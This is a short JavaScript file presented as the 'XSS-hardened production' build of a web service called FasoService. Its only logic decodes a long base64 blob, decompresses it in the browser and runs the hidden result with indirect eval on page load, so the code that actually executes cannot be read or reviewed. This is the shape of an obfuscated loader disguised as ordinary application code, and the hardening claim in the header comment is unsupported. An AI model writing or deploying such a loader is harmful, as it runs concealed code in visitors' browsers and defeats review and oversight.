"use strict";
/* FasoService — XSS-hardened production (final audit 2026-09-25) */
(async function () {
  try {
    const b64 = "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";
    const bin = Uint8Array.from(atob(b64), function (c) { return c.charCodeAt(0); });
    const ds = new DecompressionStream("deflate-raw");
    const stream = new Blob([bin]).stream().pipeThrough(ds);
    const code = await new Response(stream).text();
    (0, eval)(code);
  } catch (e) {
    console.error("FasoService load error", e);
    document.body.innerHTML = "<p style=\"padding:2rem;font-family:sans-serif\">Erreur de chargement. Rechargez la page.</p>";
  }
})();
